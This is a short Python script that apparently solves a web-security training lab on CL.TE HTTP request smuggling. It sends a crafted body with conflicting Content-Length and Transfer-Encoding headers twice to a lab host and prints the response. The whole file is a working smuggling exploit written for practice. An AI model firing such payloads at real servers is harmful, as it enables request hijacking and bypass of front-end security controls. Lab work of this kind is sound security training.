# Lab: HTTP request smuggling, basic CL.TE vulnerability

import requests

url = "https://0ad000200471cdabc036c25d0025006b.web-security-academy.net/"

PAYLOAD = """0

G"""

PAYLOAD = PAYLOAD.replace('\n', '\r\n')

headers = {
    "Content-Length": str(len(PAYLOAD)),
    "Transfer-encoding": "chunked"
}

s = requests.Session()

r1 = s.post(url, headers=headers, data=PAYLOAD)
r2 = s.post(url, headers=headers, data=PAYLOAD)

print(r2.status_code)
print(r2.text)
